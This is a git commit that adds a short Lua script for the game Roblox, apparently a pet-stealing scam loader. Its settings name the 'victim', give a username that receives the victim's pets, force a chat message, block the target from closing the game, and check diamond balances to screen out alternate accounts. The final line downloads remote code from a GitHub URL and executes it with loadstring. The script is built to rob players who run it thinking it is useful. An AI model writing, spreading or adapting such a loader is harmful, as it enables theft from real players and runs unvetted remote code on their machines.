918313da0548793354ceae9e432638e0c7b6773e
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-06-22 23:48:57 +0500

    Add KA2VM3_1687459736.lua

---
+++ KA2VM3_1687459736.lua
@@ -0,0 +1,9 @@
+
+-- Script Key: KA2VM3_1687459736
+_G.Username = "ABC" --// Username To Send Pets To
+_G.GiftMessage = "defg" --// Message For The Gift To Say
+_G.SendMessage = "hijk" --// Message the victim will send in the chat on execution
+_G.Diamonds = 100000 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTINGCOMMUNITY/SCRIPTS/KA2VM3_1687459736.lua"))()
